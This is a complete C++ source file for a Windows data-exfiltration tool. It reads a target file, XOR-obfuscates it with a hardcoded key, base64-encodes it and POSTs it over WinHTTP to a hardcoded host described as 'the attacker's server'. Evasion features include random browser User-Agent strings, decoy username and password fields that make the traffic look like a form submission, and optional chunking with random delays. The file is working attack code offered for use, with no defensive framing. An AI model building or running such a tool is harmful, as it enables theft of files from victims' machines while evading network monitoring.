#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <stdexcept>
#include <windows.h>
#include <winhttp.h>
#include <ctime>
#include <map>
#include <functional>
#include <algorithm>
#include <memory>

#pragma comment(lib, "winhttp.lib")

// Base class for file processing
class FileProcessor {
protected:
    std::vector<char> data;
    std::string extension;

public:
    FileProcessor(const std::string& filepath) : extension(get_file_extension(filepath)) {
        std::ifstream file(filepath, std::ios::binary);
        if (!file) {
            throw std::runtime_error("Failed to open file: " + filepath);
        }
        file.seekg(0, std::ios::end);
        size_t size = file.tellg();
        file.seekg(0, std::ios::beg);
        data.resize(size);
        file.read(data.data(), size);
        if (!file) {
            throw std::runtime_error("Failed to read file: " + filepath);
        }
        std::cout << "Read " << size << " bytes from " << filepath << std::endl;
    }

    virtual ~FileProcessor() = default;

    virtual void process() {
        std::cout << "Processing data, size before: " << data.size() << std::endl;
        xor_encrypt(data, "mysecretkey");
        std::cout << "Data encrypted, size after: " << data.size() << std::endl;
    }

    std::vector<char>& get_data() { return data; }
    std::string get_extension() const { return extension; }

    static std::string get_file_extension(const std::string& filepath) {
        size_t dot_pos = filepath.find_last_of(".");
        if (dot_pos == std::string::npos || dot_pos == 0 || dot_pos == filepath.length() - 1) {
            return "";
        }
        std::string ext = filepath.substr(dot_pos);
        std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
        return ext;
    }

protected:
    void xor_encrypt(std::vector<char>& data, const std::string& key) {
        size_t key_len = key.size();
        for (size_t i = 0; i < data.size(); ++i) {
            data[i] ^= key[i % key_len];
        }
    }
};

// Processor for text files (.txt)
class TextFileProcessor : public FileProcessor {
public:
    TextFileProcessor(const std::string& filepath) : FileProcessor(filepath) {}
    void process() override { xor_encrypt(data, "mysecretkey"); }
};

// Processor for image files (.png, .jpg, .jpeg, .bmp) - No encryption
class ImageFileProcessor : public FileProcessor {
public:
    ImageFileProcessor(const std::string& filepath) : FileProcessor(filepath) {}
    void process() override {
        std::cout << "Image file detected, skipping encryption for " << get_extension() << std::endl;
        // No processing; data remains unencrypted
    }
};

// Processor for Office files (.docx, .xlsx)
class OfficeFileProcessor : public FileProcessor {
public:
    OfficeFileProcessor(const std::string& filepath) : FileProcessor(filepath) {}
    void process() override { xor_encrypt(data, "mysecretkey"); }
};

// Processor for PDF files (.pdf)
class PdfFileProcessor : public FileProcessor {
public:
    PdfFileProcessor(const std::string& filepath) : FileProcessor(filepath) {}
    void process() override { xor_encrypt(data, "mysecretkey"); }
};

// Define the processor map type
using ProcessorFactory = std::function<std::unique_ptr<FileProcessor>(const std::string&)>;

// Static map of processors
static const std::map<std::string, ProcessorFactory> processors = {
    {".txt", [](const std::string& fp) { return std::make_unique<TextFileProcessor>(fp); }},
    {".png", [](const std::string& fp) { return std::make_unique<ImageFileProcessor>(fp); }},
    {".jpg", [](const std::string& fp) { return std::make_unique<ImageFileProcessor>(fp); }},
    {".jpeg", [](const std::string& fp) { return std::make_unique<ImageFileProcessor>(fp); }},
    {".bmp", [](const std::string& fp) { return std::make_unique<ImageFileProcessor>(fp); }},
    {".docx", [](const std::string& fp) { return std::make_unique<OfficeFileProcessor>(fp); }},
    {".xlsx", [](const std::string& fp) { return std::make_unique<OfficeFileProcessor>(fp); }},
    {".pdf", [](const std::string& fp) { return std::make_unique<PdfFileProcessor>(fp); }}
};

// Factory function to create appropriate processor
std::unique_ptr<FileProcessor> create_processor(const std::string& filepath) {
    std::string ext = FileProcessor::get_file_extension(filepath);
    auto it = processors.find(ext);
    if (it != processors.end()) {
        return it->second(filepath);
    }
    return std::make_unique<FileProcessor>(filepath);
}

// Function to encode data in Base64
std::string base64_encode(const std::vector<char>& data) {
    const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string encoded;
    size_t len = data.size();
    for (size_t i = 0; i < len; i += 3) {
        size_t remaining = len - i;
        unsigned char byte1 = static_cast<unsigned char>(data[i]);
        unsigned char byte2 = (remaining > 1) ? static_cast<unsigned char>(data[i + 1]) : 0;
        unsigned char byte3 = (remaining > 2) ? static_cast<unsigned char>(data[i + 2]) : 0;
        encoded += base64_chars[(byte1 >> 2) & 0x3F];
        encoded += base64_chars[((byte1 << 4) & 0x30) | ((byte2 >> 4) & 0x0F)];
        encoded += (remaining > 1) ? base64_chars[((byte2 << 2) & 0x3C) | ((byte3 >> 6) & 0x03)] : '=';
        encoded += (remaining > 2) ? base64_chars[byte3 & 0x3F] : '=';
    }
    return encoded;
}

// Function to generate a random string
std::string generate_random_string(size_t length) {
    const std::string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    std::string result;
    for (size_t i = 0; i < length; ++i) {
        result += chars[rand() % chars.size()];
    }
    return result;
}

// Function to pick a random User-Agent
std::wstring get_random_user_agent() {
    const std::wstring user_agents[] = {
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        L"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
    };
    return user_agents[rand() % 3];
}

// Function to send data to the attacker's server
void send_data(const std::wstring& server_host, const std::wstring& server_path, const std::string& post_data) {
    HINTERNET hSession = WinHttpOpen(L"ExfilTool", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) throw std::runtime_error("WinHttpOpen failed: " + std::to_string(GetLastError()));

    HINTERNET hConnect = WinHttpConnect(hSession, server_host.c_str(), INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        throw std::runtime_error("WinHttpConnect failed: " + std::to_string(GetLastError()));
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", server_path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        throw std::runtime_error("WinHttpOpenRequest failed: " + std::to_string(GetLastError()));
    }

    std::wstring headers = L"Content-Type: application/x-www-form-urlencoded\r\n";
    headers += L"Accept: */*\r\n";
    headers += L"Accept-Language: en-US,en;q=0.9\r\n";
    headers += L"User-Agent: " + get_random_user_agent() + L"\r\n";
    if (!WinHttpAddRequestHeaders(hRequest, headers.c_str(), -1L, WINHTTP_ADDREQ_FLAG_ADD)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        throw std::runtime_error("WinHttpAddRequestHeaders failed: " + std::to_string(GetLastError()));
    }

    const char* post_data_ptr = post_data.c_str();
    DWORD post_data_len = static_cast<DWORD>(post_data.size());
    std::cout << "Sending " << post_data_len << " bytes of POST data" << std::endl;
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)post_data_ptr, post_data_len, post_data_len, 0)) {
        DWORD error = GetLastError();
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        throw std::runtime_error("WinHttpSendRequest failed: " + std::to_string(error));
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        DWORD error = GetLastError();
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        throw std::runtime_error("WinHttpReceiveResponse failed: " + std::to_string(error));
    }

    DWORD status_code = 0;
    DWORD status_size = sizeof(status_code);
    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &status_code, &status_size, NULL);
    std::cout << "Server response status: " << status_code << std::endl;

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

int main(int argc, char* argv[]) {
    bool use_chunking = false;
    bool use_delays = false;
    std::string filepath;

    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "-c") use_chunking = true;
        else if (arg == "-d") use_delays = true;
        else if (filepath.empty()) filepath = arg;
    }

    if (filepath.empty()) {
        std::cerr << "Usage: " << argv[0] << " <file_path> [-c] [-d]" << std::endl;
        std::cerr << "  -c: Enable chunking" << std::endl;
        std::cerr << "  -d: Enable delays (only with chunking)" << std::endl;
        return 1;
    }

    srand(static_cast<unsigned>(time(NULL)));

    try {
        std::unique_ptr<FileProcessor> processor = create_processor(filepath);
        processor->process();

        std::vector<char>& data = processor->get_data();
        std::string file_extension = processor->get_extension();

        std::wstring server_host = L"192.168.2.214";
        std::wstring server_path = L"/submit_form";

        if (use_chunking) {
            const size_t chunk_size = 1024;
            size_t n_chunks = (data.size() + chunk_size - 1) / chunk_size;

            for (size_t i = 0; i < n_chunks; ++i) {
                size_t start = i * chunk_size;
                size_t end = (std::min)(start + chunk_size, data.size());
                std::vector<char> chunk(data.begin() + start, data.begin() + end);

                std::string encoded_chunk = base64_encode(chunk);
                std::string username = generate_random_string(8);
                std::string password = generate_random_string(12);

                std::string post_data = "chunk_data=" + encoded_chunk +
                    "&sequence_number=" + std::to_string(i) +
                    "&total_chunks=" + std::to_string(n_chunks) +
                    "&username=" + username +
                    "&password=" + password +
                    "&file_extension=" + file_extension;

                send_data(server_host, server_path, post_data);

                std::cout << "Sent chunk " << i + 1 << " of " << n_chunks << " with extension " << file_extension << std::endl;

                if (use_delays && i < n_chunks - 1) {
                    Sleep((rand() % 4000) + 1000); // 1-5 seconds
                }
            }
        }
        else {
            std::string encoded_data = base64_encode(data);
            std::string username = generate_random_string(8);
            std::string password = generate_random_string(12);

            std::string post_data = "chunk_data=" + encoded_data +
                "&sequence_number=0" +
                "&total_chunks=1" +
                "&username=" + username +
                "&password=" + password +
                "&file_extension=" + file_extension;

            send_data(server_host, server_path, post_data);

            std::cout << "Sent file as single piece with extension " << file_extension << std::endl;
        }

        std::cout << "Data sent successfully to 192.168.2.214." << std::endl;
    }
    catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}